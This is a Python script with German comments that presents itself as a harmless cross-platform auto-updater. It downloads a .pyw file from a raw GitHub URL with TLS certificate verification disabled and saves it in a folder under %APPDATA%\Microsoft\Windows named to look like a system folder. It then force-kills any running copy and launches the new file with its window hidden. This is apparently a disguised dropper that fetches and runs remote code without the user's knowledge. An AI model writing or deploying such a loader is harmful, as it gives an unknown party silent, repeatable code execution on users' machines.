"""
Einfacher, robuster Auto-Updater für Windows & Linux
Ohne externe Pakete (nur Standardbibliothek)
"""

import ssl
import sys
import os
import time
import urllib.request
import subprocess
import shutil
import platform

# ────────────────────────────────────────────────
# KONFIGURATION
MAIN_EXE_NAME = "PythonEnvironment.pyw"   # Name deiner Hauptanwendung
UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python-application-bin-files/refs/heads/main/PythonEnvironment.pyw"
# ────────────────────────────────────────────────

# Pfade relativ zum Updater-Skript
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
MAIN_FOLDER = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Environment") # type: ignore
MAIN_PATH = os.path.join(MAIN_FOLDER, MAIN_EXE_NAME)

IS_WINDOWS = platform.system().lower() == "windows"


def kill_running_main():
    """Beendet nur die Hauptanwendung, nicht den Updater selbst"""
    if not IS_WINDOWS:
        return

    try:
        subprocess.run(
            ["taskkill", "/F", "/IM", MAIN_EXE_NAME],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW # type: ignore
        )
        time.sleep(1)
    except:
        pass


def download_update():
    """Lädt die neue Version herunter"""
    temp_path = MAIN_PATH + ".new"

    try:
        context = ssl._create_unverified_context()
        with urllib.request.urlopen(UPDATE_URL, timeout=15, context=context) as resp:
            if resp.status != 200:
                return None
            data = resp.read()

        os.makedirs(MAIN_FOLDER, exist_ok=True)

        with open(temp_path, "wb") as f:
            f.write(data)

        return temp_path

    except Exception:
        if os.path.exists(temp_path):
            try:
                os.unlink(temp_path)
            except:
                pass
        return None


def apply_update(temp_file):
    """Ersetzt die alte Datei mit der neuen"""
    attempts = 5

    for i in range(attempts):
        try:
            if os.path.exists(MAIN_PATH):
                try:
                    os.remove(MAIN_PATH)
                except PermissionError:
                    kill_running_main()
                    time.sleep(1 + i)

            shutil.move(temp_file, MAIN_PATH)

            try:
                os.chmod(MAIN_PATH, 0o755)
            except:
                pass

            return True

        except PermissionError:
            kill_running_main()
            time.sleep(1 + i)
        except Exception:
            return False

    return False


def start_main_app():
    """Startet die Hauptanwendung zuverlässig unter Windows & Linux"""
    if not os.path.exists(MAIN_PATH):
        return False

    creationflags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0 # type: ignore

    try:
        if MAIN_PATH.lower().endswith((".py", ".pyw")):
            # mit gleichem Python starten wie der Updater
            subprocess.Popen(
                [sys.executable, MAIN_PATH],
                creationflags=creationflags
            )
        else:
            # exe direkt starten
            subprocess.Popen(
                [MAIN_PATH],
                creationflags=creationflags
            )
        return True
    except Exception as e:
        print("Startfehler:", e)
        return False



def main():
    os.makedirs(MAIN_FOLDER, exist_ok=True)

    kill_running_main()
    time.sleep(1)

    new_file = download_update()

    success = False
    if new_file:
        success = apply_update(new_file)

    start_main_app()
    sys.exit(0)


if __name__ == "__main__":
    main()
